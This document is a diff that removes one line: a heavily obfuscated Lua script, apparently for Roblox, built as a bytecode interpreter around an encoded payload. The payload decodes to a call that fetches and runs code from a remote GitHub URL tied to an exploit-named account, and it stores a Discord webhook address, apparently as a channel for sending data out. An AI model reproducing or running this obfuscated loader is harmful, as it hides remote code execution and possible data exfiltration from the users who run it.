@@ -1,1 +1,757 @@
-local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v83=0;local v84;while true do if (v83==0) then v84=v2(v0(v30,16));if v19 then local v97=v5(v84,v19);v19=nil;return v97;else return v84;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v85=(v31/((5 -3)^(v32-(2 -1))))%((3 -(1638 -(1523 + 114)))^(((v33-(2 -1)) -(v32-(620 -(555 + 64)))) + ((838 + 94) -(857 + 74)))) ;return v85-(v85%(569 -(367 + (1078 -(282 + 595))))) ;else local v86=2^(v32-(928 -(214 + 713))) ;return (((v31%(v86 + v86))>=v86) and (1 + (0 -0))) or (0 + 0) ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35=957 -(892 + 65) ;local v36;local v37;while true do if (v35==(1066 -(68 + (2377 -1380)))) then return (v37 * (1526 -(226 + 1044))) + v36 ;end if (v35==(0 -0)) then v36,v37=v1(v16,v18,v18 + (119 -(32 + 85)) );v18=v18 + 2 + 0 ;v35=1 + 0 ;end end end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + (5 -2) );v18=v18 + (7 -3) ;return (v41 * (16777566 -(87 + 263))) + (v40 * (65716 -(67 + (277 -164)))) + (v39 * (188 + 68)) + v38 ;end local function v24() local v42=0 + 0 ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==(11 -8)) then if (v47==(952 -(802 + 150))) then if (v46==0) then return v48 * (0 -0) ;else v47=1 -0 ;v45=0 + 0 ;end elseif (v47==(3044 -((1353 -(145 + 293)) + 82))) then return ((v46==(0 -0)) and (v48 * ((1 + 0)/(0 -(0 + 0))))) or (v48 * NaN) ;end return v8(v48,v47-(2210 -(1069 + 118)) ) * (v45 + (v46/((4 -2)^52))) ;end if (v42==((430 -(44 + 386)) -(0 + 0))) then v43=v23();v44=v23();v42=1 + 0 ;end if (v42==((775 -(201 + 571)) -1)) then v47=v20(v44,21,31 + 0 );v48=((v20(v44,32)==(792 -(368 + 423))) and  -(3 -2)) or (1139 -(116 + 1022)) ;v42=3;end if (v42==(19 -((1496 -(998 + 488)) + 8))) then v45=3 -2 ;v46=(v20(v44,(1844 -1401) -(416 + 26) ,(37 + 26) -43 ) * ((1 + 1)^32)) + v43 ;v42=3 -1 ;end end end local function v25(v49) local v50;if  not v49 then local v87=0 -0 ;while true do if (v87==0) then v49=v23();if (v49==((0 + 0) -0)) then return "";end break;end end end v50=v3(v16,v18,(v18 + v49) -(860 -(814 + 45)) );v18=v18 + v49 ;local v51={};for v66=2 -1 , #v50 do v51[v66]=v2(v1(v3(v50,v66,v66)));end return v6(v51);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return 0 + 0 ;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();local v59=(function() return;end)();while true do local v68=(function() return 0;end)();while true do if (v68~=0) then else if (v52==0) then v53=(function() return function(v101,v102,v103) local v104=(function() return 0 -0 ;end)();local v105=(function() return;end)();while true do if ((0 -0)==v104) then v105=(function() return 0;end)();while true do if (v105~=(0 -0)) then else local v296=(function() return 0 -0 ;end)();while true do if (v296==(285 -(134 + 151))) then local v349=(function() return 0;end)();while true do if (v349~=0) then else v101[v102-#"\\" ]=(function() return v103();end)();return v101,v102,v103;end end end end end end break;end end end;end)();v54=(function() return {};end)();v55=(function() return {};end)();v56=(function() return {};end)();v52=(function() return 1;end)();end if (v52==2) then v57[ #"gha"]=(function() return v21();end)();for v98= #"~",v23() do local v99=(function() return v21();end)();if (v20(v99, #"!", #">")==0) then local v106=(function() return 1665 -(970 + 695) ;end)();local v107=(function() return;end)();local v108=(function() return;end)();local v109=(function() return;end)();local v110=(function() return;end)();while true do if (v106==1) then local v115=(function() return 0 -0 ;end)();local v116=(function() return;end)();while true do if (v115==0) then v116=(function() return 1990 -(582 + 1408) ;end)();while true do if (v116~=(0 -0)) then else v109=(function() return nil;end)();v110=(function() return nil;end)();v116=(function() return 1 -0 ;end)();end if (v116~=(3 -2)) then else v106=(function() return 1826 -(1195 + 629) ;end)();break;end end break;end end end if (v106~=0) then else local v117=(function() return 0 -0 ;end)();local v118=(function() return;end)();while true do if (v117~=0) then else v118=(function() return 241 -(187 + 54) ;end)();while true do if (v118==0) then v107=(function() return 0;end)();v108=(function() return nil;end)();v118=(function() return 1;end)();end if (v118==1) then v106=(function() return 1;end)();break;end end break;end end end if (v106~=2) then else while true do if (v107~=(782 -(162 + 618))) then else local v324=(function() return 0;end)();while true do if (v324==0) then if (v20(v109, #"|", #"~")== #"[") then v110[2]=(function() return v59[v110[2 + 0 ]];end)();end if (v20(v109,2 + 0 ,3 -1 )~= #",") then else v110[ #"91("]=(function() return v59[v110[ #"19("]];end)();end v324=(function() return 1;end)();end if (v324==(1 -0)) then v107=(function() return  #"xxx";end)();break;end end end if (v107~=0) then else local v325=(function() return 0;end)();while true do if (v325~=0) then else v108=(function() return v20(v99,1 + 1 , #"xnx");end)();v109=(function() return v20(v99, #"0313",1642 -(1373 + 263) );end)();v325=(function() return 1;end)();end if (v325~=(1001 -(451 + 549))) then else v107=(function() return  #"}";end)();break;end end end if (v107== #"{") then local v326=(function() return 0;end)();while true do if (v326==0) then v110=(function() return {v22(),v22(),nil,nil};end)();if (v108==0) then local v393=(function() return 0;end)();local v394=(function() return;end)();while true do if (v393==0) then v394=(function() return 0 -0 ;end)();while true do if ((0 -0)==v394) then v110[ #"19("]=(function() return v22();end)();v110[ #"0836"]=(function() return v22();end)();break;end end break;end end elseif (v108== #",") then v110[ #"xnx"]=(function() return v23();end)();elseif (v108==2) then v110[ #"nil"]=(function() return v23() -(2^(1400 -(746 + 638))) ;end)();elseif (v108== #"19(") then local v412=(function() return 0;end)();while true do if (v412==(0 + 0)) then v110[ #"xxx"]=(function() return v23() -(2^(23 -7)) ;end)();v110[ #".com"]=(function() return v22();end)();break;end end end v326=(function() return 1;end)();end if ((342 -(218 + 123))==v326) then v107=(function() return 2;end)();break;end end end if (v107~= #"-19") then else if (v20(v109, #"-19", #"gha")~= #" ") then else v110[ #"0313"]=(function() return v59[v110[ #"?id="]];end)();end v54[v98]=(function() return v110;end)();break;end end break;end end end end for v100= #"\\",v23() do v55,v100,v28=(function() return v53(v55,v100,v28);end)();end return v57;end v68=(function() return 1;end)();end if (v68==(1582 -(1535 + 46))) then if ((1 + 0)~=v52) then else local v96=(function() return 0 + 0 ;end)();while true do if (v96~=1) then else v59=(function() return {};end)();for v111= #"~",v58 do local v112=(function() return 0;end)();local v113=(function() return;end)();local v114=(function() return;end)();while true do if (v112==1) then if (v113== #"}") then v114=(function() return v21()~=(560 -(306 + 254)) ;end)();elseif (v113==(1 + 1)) then v114=(function() return v24();end)();elseif (v113~= #"asd") then else v114=(function() return v25();end)();end v59[v111]=(function() return v114;end)();break;end if ((0 -0)==v112) then local v277=(function() return 1467 -(899 + 568) ;end)();while true do if (v277~=0) then else v113=(function() return v21();end)();v114=(function() return nil;end)();v277=(function() return 1;end)();end if (v277==1) then v112=(function() return 1 + 0 ;end)();break;end end end end end v96=(function() return 4 -2 ;end)();end if (2==v96) then v52=(function() return 605 -(268 + 335) ;end)();break;end if (v96==0) then v57=(function() return {v54,v55,nil,v56};end)();v58=(function() return v23();end)();v96=(function() return 291 -(60 + 230) ;end)();end end end break;end end end end local function v29(v60,v61,v62) local v63=v60[573 -(426 + 146) ];local v64=v60[1 + 1 ];local v65=v60[1459 -(282 + (1697 -(423 + 100))) ];return function(...) local v69=v63;local v70=v64;local v71=v65;local v72=v27;local v73=812 -(569 + 2 + 240) ;local v74= -(2 -1);local v75={};local v76={...};local v77=v12("#",...) -(1025 -(706 + 318)) ;local v78={};local v79={};for v88=1251 -(721 + 530) ,v77 do if ((v88>=v71) or (3654>=4654)) then v75[v88-v71 ]=v76[v88 + 1 ];else v79[v88]=v76[v88 + (1272 -(945 + 170 + 156)) ];end end local v80=(v77-v71) + 1 ;local v81;local v82;while true do v81=v69[v73];v82=v81[(773 -(326 + 445)) -1 ];if ((951<=1496) and (v82<=18)) then if ((3079<4794) and (v82<=(8 + 0))) then if (v82<=(703 -(271 + (1872 -1443)))) then if (v82<=(1 + 0)) then if ((4854>4464) and (v82>(1500 -(1408 + 92)))) then v79[v81[2]]=v79[v81[1089 -(461 + 625) ]]%v79[v81[(2877 -1585) -(993 + 295) ]] ;else v79[v81[1 + 1 ]]={};end elseif (v82==(1173 -(418 + 753))) then local v121=(0 -0) + 0 ;local v122;while true do if ((v121==(0 + 0)) or (4912==3758)) then v122=v81[1 + (712 -(530 + 181)) ];do return v13(v79,v122,v74);end break;end end else v79[v81[1 + 1 ]]=v79[v81[(1413 -(614 + 267)) -(406 + (155 -(19 + 13))) ]][v81[(2884 -1111) -(1749 + 20) ]];v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]=v79[v81[(2 -1) + 2 ]][v81[1326 -(1249 + 73) ]];v73=v73 + 1 + 0 ;v81=v69[v73];v79[v81[2]][v79[v81[(3279 -2131) -(466 + 679) ]]]=v79[v81[9 -(2 + 3) ]];v73=v73 + (2 -1) ;v81=v69[v73];v79[v81[1902 -((185 -79) + 1794) ]]=v62[v81[1 + 2 ]];v73=v73 + 1 + 0 ;v81=v69[v73];v79[v81[(10 -5) -3 ]]=v79[v81[3]][v81[10 -6 ]];v73=v73 + (115 -(4 + 110)) ;v81=v69[v73];v79[v81[586 -(57 + 527) ]][v79[v81[1430 -(41 + 1386) ]]]=v81[107 -(17 + 86) ];v73=v73 + 1 + 0 ;v81=v69[v73];v79[v81[3 -1 ]]=v81[8 -5 ];end elseif (v82<=(171 -(122 + 44))) then if ((v82>(6 -(1814 -(1293 + 519)))) or (1736==571)) then v79[v81[6 -4 ]]=v79[v81[3 + 0 ]]%v81[4] ;else v79[v81[1 + 1 ]]=v79[v81[5 -2 ]][v81[69 -(30 + 35) ]];end elseif ((v82<=6) or (896>4769)) then local v141=v81[2 + 0 ];local v142,v143=v72(v79[v141](v13(v79,v141 + 1 ,v74)));v74=(v143 + v141) -((2566 -1308) -(1043 + 214)) ;local v144=0 -0 ;for v278=v141,v74 do v144=v144 + (1213 -(323 + 889)) ;v79[v278]=v142[v144];end elseif ((126<=3482) and (v82==(18 -11))) then local v297=580 -((942 -581) + 219) ;local v298;while true do if (v297==(320 -(53 + 267))) then v298=v81[1 + 1 ];v79[v298]=v79[v298](v13(v79,v298 + 1 ,v74));break;end end else v79[v81[(793 -378) -(15 + (1716 -1318)) ]]();end elseif (v82<=((2343 -1348) -(18 + 964))) then if ((v82<=(37 -27)) or (1045<=1020)) then if ((v82>(6 + 3)) or (2374==4374)) then local v145=0 + 0 ;local v146;local v147;local v148;while true do if (v145==(851 -(20 + 830))) then v148=v79[v146 + 2 + 0 ];if (v148>(126 -(116 + 10))) then if (v147>v79[v146 + 1 ]) then v73=v81[1 + 0 + 1 + 1 ];else v79[v146 + (741 -(542 + 196)) ]=v147;end elseif (v147<v79[v146 + (1 -0) ]) then v73=v81[1 + 2 ];else v79[v146 + 2 + 1 ]=v147;end break;end if ((1575==1575) and ((0 + 0)==v145)) then v146=v81[4 -2 ];v147=v79[v146];v145=2 -1 ;end end else v79[v81[2]]=v81[(3610 -2056) -(1126 + 425) ];end elseif ((v82<=(416 -(118 + 287))) or (1160<=328)) then local v151;v79[v81[7 -5 ]]=v81[1124 -(118 + 1003) ];v73=v73 + (2 -1) ;v81=v69[v73];v79[v81[2]]=v81[380 -(142 + 55 + 180) ];v73=v73 + (4 -3) ;v81=v69[v73];v151=v81[1 + 1 ];v79[v151]=v79[v151](v13(v79,v151 + (978 -(553 + 424)) ,v81[5 -(1 + 1) ]));v73=v73 + 1 + 0 ;v81=v69[v73];v79[v81[2 + 0 ]][v81[3]]=v79[v81[3 + 1 ]];v73=v73 + 1 ;v81=v69[v73];v79[v81[1 + 1 ]]=v81[3];v73=v73 + 1 + 0 ;v81=v69[v73];for v281=v81[4 -2 ],v81[7 -4 ] do v79[v281]=nil;end elseif (v82>((17 + 9) -14)) then v73=v81[1 + 2 ];else local v300=0 -0 ;local v301;local v302;local v303;local v304;while true do if (v300==(755 -((1335 -(709 + 387)) + 514))) then for v369=v301,v74 do local v370=0 + 0 ;while true do if (v370==(1329 -(797 + 532))) then v304=v304 + 1 ;v79[v369]=v302[v304];break;end end end break;end if ((v300==(1 + (1858 -(673 + 1185)))) or (2234==1455)) then v74=(v303 + v301) -(1 + 0) ;v304=0 -0 ;v300=(3491 -2287) -((1197 -824) + 829) ;end if (v300==(731 -(476 + 255))) then v301=v81[1132 -(369 + 761) ];v302,v303=v72(v79[v301](v79[v301 + 1 + (0 -0) ]));v300=1;end end end elseif (v82<=(27 -12)) then if ((3808>2924) and (v82==(26 -12))) then if (v79[v81[240 -(64 + 174) ]]==v81[1 + 3 ]) then v73=v73 + (1 -0) ;else v73=v81[339 -(144 + 192) ];end else local v163=v81[218 -(42 + 125 + 49) ];local v164=v79[v81[3 + 0 ]];v79[v163 + 1 + 0 ]=v164;v79[v163]=v164[v81[2 + 2 ]];end elseif ((v82<=16) or (1067>1779)) then do return;end elseif (v82==(1521 -(363 + 1141))) then for v332=v81[1582 -(1183 + 397) ],v81[8 -5 ] do v79[v332]=nil;end else local v306=0 + 0 ;local v307;local v308;local v309;while true do if ((2161>=934) and (v306==(0 + 0))) then v307=v70[v81[1978 -(1913 + 62) ]];v308=nil;v306=1 + 0 + 0 ;end if (v306==(5 -3)) then for v371=1,v81[1937 -(565 + 1368) ] do v73=v73 + (3 -2) ;local v372=v69[v73];if ((1612==1612) and (v372[1662 -((1994 -517) + 184) ]==(48 -12))) then v309[v371-(1 + 0) ]={v79,v372[8 -5 ]};else v309[v371-1 ]={v61,v372[3 + 0 ]};end v78[ #v78 + (477 -(41 + 435)) ]=v309;end v79[v81[1003 -(938 + 63) ]]=v29(v307,v308,v62);break;end if ((3891<4919) and (v306==(1 + 0))) then v309={};v308=v10({},{__index=function(v374,v375) local v376=1125 -(936 + 189) ;local v377;while true do if (v376==(0 + 0)) then v377=v309[v375];return v377[1614 -(1565 + 48) ][v377[2 + 0 ]];end end end,__newindex=function(v378,v379,v380) local v381=1138 -(782 + 356) ;local v382;while true do if (v381==(267 -(176 + 91))) then v382=v309[v379];v382[2 -1 ][v382[2 -0 ]]=v380;break;end end end});v306=1094 -(975 + 117) ;end end end elseif (v82<=(1903 -(157 + 1718))) then if (v82<=(19 + 4)) then if (v82<=(70 -50)) then if ((4352>=2833) and (v82==(64 -45))) then v79[v81[2]]=v62[v81[1021 -(697 + 321) ]];else local v170=(0 -0) -(1880 -(446 + 1434)) ;local v171;while true do if ((v170==(0 -0)) or (2234<=1502)) then v171=v81[2];do return v79[v171](v13(v79,v171 + (2 -1) ,v81[3]));end break;end end end elseif (v82<=(9 + 12)) then local v172;local v173,v174;local v175;v79[v81[3 -1 ]]=v79[v81[1286 -(1040 + 243) ]];v73=v73 + (2 -1) ;v81=v69[v73];v79[v81[1229 -(322 + 905) ]]=v61[v81[614 -(602 + 9) ]];v73=v73 + (1190 -((1340 -891) + 740)) ;v81=v69[v73];v79[v81[874 -(826 + 46) ]]=v61[v81[950 -(245 + 702) ]];v73=v73 + (3 -2) ;v81=v69[v73];v79[v81[1 + 1 ]]=v61[v81[1901 -(260 + 1638) ]];v73=v73 + 1 ;v81=v69[v73];v79[v81[442 -(382 + 58) ]]=v61[v81[(1856 -(559 + 1288)) -6 ]];v73=v73 + 1 ;v81=v69[v73];v79[v81[(1933 -(609 + 1322)) + 0 ]]=v79[v81[5 -2 ]];v73=v73 + (2 -1) ;v81=v69[v73];v79[v81[1207 -(902 + 303) ]]=v79[v81[5 -2 ]];v73=v73 + ((456 -(13 + 441)) -1) ;v81=v69[v73];v79[v81[1 + 1 ]]=v79[v81[1693 -(1121 + 569) ]] + v81[218 -(22 + 192) ] ;v73=v73 + (684 -(483 + 200)) ;v81=v69[v73];v175=v81[1465 -((5246 -3842) + (154 -95)) ];v173,v174=v72(v79[v175](v13(v79,v175 + 1 ,v81[8 -(24 -19) ])));v74=(v174 + v175) -(1 -0) ;v172=(29 + 736) -(468 + 297) ;for v283=v175,v74 do local v284=562 -(334 + 228) ;while true do if (v284==(0 -0)) then v172=v172 + 1 ;v79[v283]=v173[v172];break;end end end v73=v73 + (2 -1) ;v81=v69[v73];v175=v81[2 -0 ];v79[v175]=v79[v175](v13(v79,v175 + 1 ,v74));v73=v73 + 1 + 0 ;v81=v69[v73];v79[v81[238 -(141 + 95) ]]=v61[v81[3]];v73=v73 + 1 + 0 ;v81=v69[v73];v79[v81[4 -(7 -5) ]]=v61[v81[6 -3 ]];v73=v73 + 1 + 0 + 0 ;v81=v69[v73];v79[v81[2]]=v79[v81[8 -5 ]];v73=v73 + 1 + 0 + 0 ;v81=v69[v73];v79[v81[2]]= #v79[v81[2 + 1 ]];v73=v73 + (1 -0) ;v81=v69[v73];v79[v81[2]]=v79[v81[2 + 1 ]]%v79[v81[167 -(92 + 71) ]] ;v73=v73 + 1 + 0 ;v81=v69[v73];v79[v81[(5 -3) -0 ]]=v81[768 -(315 + 259 + 191) ] + v79[v81[4 + 0 ]] ;v73=v73 + (2 -1) ;v81=v69[v73];v79[v81[2 + 0 ]]= #v79[v81[(1566 -714) -(254 + 595) ]];v73=v73 + 1 ;v81=v69[v73];v79[v81[128 -(55 + 71) ]]=v79[v81[3 -(0 + 0) ]]%v79[v81[(998 + 796) -(573 + 875 + 342) ]] ;v73=v73 + (2 -1) ;v81=v69[v73];v79[v81[2]]=v81[1 + 2 ] + v79[v81[4]] ;v73=v73 + (1 -0) ;v81=v69[v73];v79[v81[941 -(714 + 225) ]]=v79[v81[8 -5 ]] + v81[5 -1 ] ;v73=v73 + 1 ;v81=v69[v73];v175=v81[1 + 1 + 0 ];v173,v174=v72(v79[v175](v13(v79,v175 + (1 -0) ,v81[809 -(118 + 688) ])));v74=(v174 + v175) -(49 -(25 + 23)) ;v172=0 + 0 + 0 ;for v285=v175,v74 do local v286=1886 -(927 + 959) ;while true do if (v286==(0 -0)) then v172=v172 + (733 -(16 + 716)) ;v79[v285]=v173[v172];break;end end end v73=v73 + (1 -0) ;v81=v69[v73];v175=v81[99 -(11 + 86) ];v173,v174=v72(v79[v175](v13(v79,v175 + (2 -(434 -(153 + 280))) ,v74)));v74=(v174 + v175) -(286 -(175 + (317 -207))) ;v172=0;for v287=v175,v74 do local v288=0 -(0 + 0) ;while true do if (v288==((0 + 0) -0)) then v172=v172 + 1 ;v79[v287]=v173[v172];break;end end end v73=v73 + (1797 -(503 + 1293)) ;v81=v69[v73];v175=v81[5 -3 ];v79[v175]=v79[v175](v13(v79,v175 + 1 + 0 ,v74));v73=v73 + (1062 -(810 + 251)) ;v81=v69[v73];v79[v81[2 + 0 ]]=v79[v81[3]]%v81[4] ;v73=v73 + 1 + 0 ;v81=v69[v73];v175=v81[2 + 0 + 0 ];v173,v174=v72(v79[v175](v79[v175 + (534 -(43 + 445 + 45)) ]));v74=(v174 + v175) -(734 -(711 + 16 + 6)) ;v172=0 -0 ;for v289=v175,v74 do local v290=859 -(240 + 619) ;while true do if ((v290==(0 + 0)) or (2512<432) or (3222<3073)) then v172=v172 + (1 -(0 -0)) ;v79[v289]=v173[v172];break;end end end v73=v73 + 1 + 0 ;v81=v69[v73];v175=v81[1 + 1 ];v79[v175](v13(v79,v175 + 1 ,v74));elseif (v82==(1766 -(1344 + 400))) then v79[v81[407 -((922 -(89 + 578)) + 150) ]][v79[v81[3 + 0 ]]]=v81[4];else v79[v81[2 + 0 + 0 ]]=v81[12 -9 ] + v79[v81[4]] ;end elseif ((v82<=(80 -55)) or (1848==865)) then if (v82==(49 -25)) then v79[v81[2]]=v79[v81[1742 -(404 + 1335) ]] + v81[410 -(183 + 223) ] ;else v79[v81[2]]=v61[v81[(1052 -(572 + 477)) -0 ]];end elseif ((v82<=(4 + 22)) or (4682<=4541)) then local v211=v81[2 + 0 ];v79[v211]=v79[v211](v13(v79,v211 + 1 + 0 + 0 ,v81[3]));elseif (v82==(364 -(10 + 327))) then if  not v79[v81[2 + 0 ]] then v73=v73 + 1 ;else v73=v81[341 -(118 + 220) ];end else local v313=v81[1 + 1 ];v79[v313](v13(v79,v313 + 1 ,v74));end elseif (v82<=(482 -(108 + 341))) then if ((v82<=(14 + 16)) or (3026>=4046)) then if (v82>(122 -93)) then local v213;v79[v81[(179 + 1316) -(711 + 782) ]]=v79[v81[5 -2 ]];v73=v73 + ((556 -(84 + 2)) -(270 + 199)) ;v81=v69[v73];v79[v81[1 + 1 ]]=v81[1822 -(580 + 1239) ];v73=v73 + (2 -(1 -0)) ;v81=v69[v73];v79[v81[2]]=v81[3];v73=v73 + 1 + 0 ;v81=v69[v73];v213=v81[1 + 1 ];v79[v213]=v79[v213](v13(v79,v213 + 1 + 0 ,v81[3 + 0 ]));v73=v73 + (2 -1) ;v81=v69[v73];v79[v81[2 + 0 ]][v81[1170 -(645 + 522) ]]=v79[v81[4]];v73=v73 + ((2633 -(497 + 345)) -(1010 + 780)) ;v81=v69[v73];v79[v81[2 + 0 ]]=v79[v81[14 -11 ]];v73=v73 + 1 ;v81=v69[v73];v79[v81[(1 + 4) -3 ]]=v81[1839 -(1045 + 791) ];v73=v73 + 1 ;v81=v69[v73];v79[v81[(1 + 3) -2 ]]=v81[4 -1 ];v73=v73 + 1 ;v81=v69[v73];v213=v81[507 -(351 + (1487 -(605 + 728))) ];v79[v213]=v79[v213](v13(v79,v213 + 1 ,v81[1577 -(1281 + 293) ]));v73=v73 + (267 -(28 + 238)) ;v81=v69[v73];v79[v81[4 -2 ]][v81[3]]=v79[v81[4]];else local v233=v81[1561 -(1381 + 127 + 51) ];local v234,v235=v72(v79[v233](v13(v79,v233 + 1 + 0 ,v81[3])));v74=(v235 + v233) -(1 + 0) ;local v236=0 + 0 ;for v291=v233,v74 do v236=v236 + 1 ;v79[v291]=v234[v236];end end elseif (v82<=(106 -75)) then local v237;local v238,v239;local v240;local v241;v79[v81[2 + 0 ]]=v62[v81[473 -(381 + 89) ]];v73=v73 + 1 + 0 ;v81=v69[v73];v241=v81[(3 -1) + 0 ];v240=v79[v81[3]];v79[v241 + (1 -0) ]=v240;v79[v241]=v240[v81[1160 -(1074 + 4 + 78) ]];v73=v73 + (1 -0) ;v81=v69[v73];v79[v81[1786 -(214 + (5804 -4234)) ]]=v81[1458 -(990 + 465) ];v73=v73 + 1 + 0 + 0 ;v81=v69[v73];v241=v81[1 + 1 ];v238,v239=v72(v79[v241](v13(v79,v241 + 1 + 0 ,v81[11 -8 ])));v74=(v239 + v241) -(1727 -(1668 + 58)) ;v237=626 -(512 + 114) ;for v294=v241,v74 do local v295=0 -0 ;while true do if ((2008>638) and (v295==0)) then v237=v237 + 1 ;v79[v294]=v238[v237];break;end end end v73=v73 + (1 -0) ;v81=v69[v73];v241=v81[6 -4 ];v79[v241]=v79[v241](v13(v79,v241 + 1 + 0 ,v74));v73=v73 + 1 + 0 ;v81=v69[v73];v79[v81[2 + 0 ]]();v73=v73 + (3 -2) ;v81=v69[v73];v73=v81[1997 -(109 + 1885) ];elseif ((1775<=3233) and (v82==(1501 -(1269 + 200)))) then v79[v81[2]][v79[v81[5 -2 ]]]=v79[v81[819 -(98 + 717) ]];else local v316=0 -0 ;local v317;local v318;local v319;while true do if ((744<=2942) and (v316==(830 -(802 + 24)))) then v79[v81[2 -0 ]]=v81[3 -0 ];v73=v73 + 1 + 0 ;v81=v69[v73];v316=4 + 1 ;end if ((v316==(1 + 2)) or (1833<=1322)) then v79[v81[1 + 1 ]]= #v79[v81[8 -5 ]];v73=v73 + (3 -(2 + 0)) ;v81=v69[v73];v316=2 + 2 ;end if (0==v316) then v317=nil;v318=nil;v319=nil;v316=1;end if ((v316==(1 + (489 -(457 + 32)))) or (4543==1997)) then v79[v81[2 + 0 ]]={};v73=v73 + 1 + 0 ;v81=v69[v73];v316=1 + 1 ;end if ((v316==(1435 -(797 + 636))) or (3102<728)) then v79[v81[9 -7 ]]=v81[1622 -(1427 + 192) ];v73=v73 + 1 + 0 ;v81=v69[v73];v316=6 -3 ;end if ((v316==(6 + 0)) or (3467<=1055)) then if (v317>(0 + 0)) then if ((345==345) and (v318>v79[v319 + (327 -(192 + 134)) ])) then v73=v81[3];else v79[v319 + 3 ]=v318;end elseif ((3541==3541) and (v318<v79[v319 + (1277 -(316 + 960)) ])) then v73=v81[2 + 1 ];else v79[v319 + 2 + 1 + (1402 -(832 + 570)) ]=v318;end break;end if (((5 + 0)==v316) or (3557>=4003)) then v319=v81[7 -5 ];v318=v79[v319];v317=v79[v319 + (553 -(83 + 441 + 27)) ];v316=1812 -(1202 + 604) ;end end end elseif (v82<=35) then if ((v82==(158 -124)) or (2827<378)) then v79[v81[2 -0 ]]={};v73=v73 + (2 -1) ;v81=v69[v73];v79[v81[327 -(45 + 74 + 206) ]]=v62[v81[3 + 0 ]];v73=v73 + 1 + 0 ;v81=v69[v73];v79[v81[1 + 1 ]]=v79[v81[2 + 1 ]][v81[1 + 3 ]];v73=v73 + 1 ;v81=v69[v73];v79[v81[3 -1 ]]=v62[v81[(6773 -4859) -(340 + 1571) ]];v73=v73 + 1 + 0 ;v81=v69[v73];v79[v81[1774 -(1733 + 39) ]]=v79[v81[8 -5 ]][v81[1038 -(125 + 909) ]];v73=v73 + (1949 -(1096 + 852)) ;v81=v69[v73];v79[v81[1 + 1 ]]=v62[v81[3 -0 ]];v73=v73 + 1 + 0 ;v81=v69[v73];v79[v81[514 -(409 + 103) ]]=v79[v81[239 -(46 + 190) ]][v81[(48 + 51) -(51 + 44) ]];v73=v73 + 1 + 0 ;v81=v69[v73];v79[v81[1319 -(1114 + 203) ]]=v62[v81[3]];v73=v73 + (727 -(228 + 498)) ;v81=v69[v73];if ( not v79[v81[798 -(588 + 208) ]] or (657>=1668)) then v73=v73 + 1 + 0 ;else v73=v81[3];end else local v270=0;local v271;local v272;local v273;while true do if (v270==(1 + 0)) then v273=v79[v271] + v272 ;v79[v271]=v273;v270=2;end if (v270==(665 -(174 + 489))) then if ((v272>(0 -0)) or (3476<2597)) then if (v273<=v79[v271 + (1906 -(830 + 1075)) ]) then v73=v81[(1420 -893) -(303 + 221) ];v79[v271 + 3 ]=v273;end elseif ((v273>=v79[v271 + 1 ]) or (1027>3858)) then local v389=0;while true do if (v389==(1269 -(231 + 1038))) then v73=v81[3 + (1800 -(884 + 916)) ];v79[v271 + (1165 -(171 + 991)) ]=v273;break;end end end break;end if (v270==(0 -0)) then v271=v81[5 -3 ];v272=v79[v271 + (4 -2) ];v270=1 + 0 ;end end end elseif (v82<=((263 -137) -90)) then v79[v81[2]]=v79[v81[(5 + 3) -5 ]];elseif (v82==37) then v79[v81[2 -0 ]]= #v79[v81[9 -6 ]];else v79[v81[1250 -((764 -(232 + 421)) + 1137) ]][v81[161 -(91 + 67) ]]=v79[v81[11 -7 ]];end v73=v73 + 1 + (1889 -(1569 + 320)) ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!1B3Q0003063Q00737472696E6703043Q006368617203043Q00627974652Q033Q0073756203053Q0062697433322Q033Q0062697403043Q0062786F7203053Q007461626C6503063Q00636F6E63617403063Q00696E73657274026Q00104003073Q0044A0BCF049397803063Q005613C5DE9826026Q000840030E3Q00D4F4B8372DDCEEB8301BD8FEFA3703053Q0072B69BCB44027Q004003083Q00133DFB4218BD2Q2B03063Q00DC464E9E3076028Q00026Q00F03F030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574034B3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F4461677A706C6F69742F7261696E626F772F726566732F68656164732F6D61696E2F667269656E647303023Q005F4703793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F313332333138303235303536353331323536322F5F33686D4B454238365F6C4632576530507438525149526271644A65396C66684E7745474678536277425676394A684B6D537A75382D4539554E51616938374364634A51004B4Q00227Q00122Q000100013Q00202Q00010001000200122Q000200013Q00202Q00020002000300122Q000300013Q00202Q00030003000400122Q000400053Q00062Q0004000B0001000100040D3Q000B0001001213000400063Q002004000500040007001213000600083Q002004000600060009001213000700083Q00200400070007000A00061200083Q000100062Q00243Q00074Q00243Q00014Q00243Q00054Q00243Q00024Q00243Q00034Q00243Q00064Q001E000900083Q00122Q000A000C3Q00122Q000B000D6Q0009000B000200104Q000B00094Q000900083Q00122Q000A000F3Q00122Q000B00106Q0009000B000200104Q000E00092Q0024000900083Q00120B000A00123Q00122Q000B00136Q0009000B000200104Q0011000900122Q000900146Q000A000A3Q00260E000900280001001400040D3Q00280001001209000A00143Q00260E000A00350001001500040D3Q00350001001213000B00163Q00121F000C00173Q00202Q000C000C001800122Q000E00196Q000C000E6Q000B3Q00024Q000B0001000100044Q004A000100260E000A002B0001001400040D3Q002B0001001209000B00143Q00260E000B00420001001400040D3Q00420001001213000C001A3Q002003000D3Q001100202Q000E3Q000E4Q000C000D000E00122Q000C001A3Q00202Q000D3Q000B00202Q000C000D001B00122Q000B00153Q00260E000B00380001001500040D3Q00380001001209000A00153Q00040D3Q002B000100040D3Q0038000100040D3Q002B000100040D3Q004A000100040D3Q002800012Q00103Q00013Q00013Q00023Q00026Q00F03F026Q00704